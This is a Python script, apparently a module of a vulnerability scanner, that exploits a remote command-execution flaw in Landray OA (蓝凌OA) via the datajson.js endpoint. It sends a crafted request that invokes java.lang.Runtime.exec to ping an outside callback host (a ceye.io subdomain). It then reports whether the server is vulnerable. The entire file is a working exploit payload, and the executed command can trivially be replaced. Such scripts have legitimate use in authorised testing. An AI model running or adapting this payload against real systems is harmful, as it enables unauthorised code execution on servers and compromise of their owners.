import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 蓝凌OA_datajson_命令执行(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }

    exp_url = urldata + 'data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 10iknb.ceye.io")'
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(exp_url, headers=headers, verify=False)
        if "模拟通过" in respones.text:
            print(Vcolors.RED + "[+] 蓝凌OA datajson 命令执行漏洞存在" +Vcolors.ENDC)
            print(Vcolors.RED + "[+] payload:{}".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 蓝凌OA datajson 命令执行漏洞可能不存在" +Vcolors.ENDC)
    except:
            logging.error("蓝凌OA_datajson_命令执行脚本出现异常")

